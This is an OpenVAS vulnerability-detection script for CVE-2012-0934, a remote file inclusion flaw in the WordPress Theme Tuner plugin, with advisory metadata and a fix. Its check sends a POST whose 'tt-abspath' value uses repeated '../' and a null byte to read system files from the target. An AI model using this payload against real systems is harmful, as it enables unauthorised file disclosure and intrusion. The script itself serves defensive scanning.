###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Theme Tuner Plugin 'tt-abspath' Parameter Remote File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802604");
  script_version("2023-03-01T10:20:04+0000");
  script_cve_id("CVE-2012-0934");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2012-02-03 12:12:12 +0530 (Fri, 03 Feb 2012)");
  script_name("WordPress Theme Tuner Plugin 'tt-abspath' Parameter Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/47722");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51636");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72626");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/theme-tuner/changelog");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset/492167/theme-tuner#file2");
  script_xref(name:"URL", value:"http://spareclockcycles.org/2011/09/18/exploitring-the-wordpress-extension-repos");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to compromise the
  application and the underlying system. Other attacks are also possible.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"WordPress Theme Tuner Plugin version 0.7 and prior.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input to
  the 'tt-abspath' parameter in '/ajax/savetag.php', which allows attackers to execute arbitrary PHP
  code.");

  script_tag(name:"solution", value:"Update to WordPress Theme Tuner Plugin version 0.8 or later.");

  script_tag(name:"summary", value:"WordPress is prone to a remote file inclusion vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/theme-tuner/ajax/savetag.php";

useragent = http_get_user_agent();

files = traversal_files();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach file(keys(files)) {

  postData = string("tt-abspath=", crap(data:"../", length:6*9), files[file], "%00");

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if(egrep(pattern:file, string:res)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
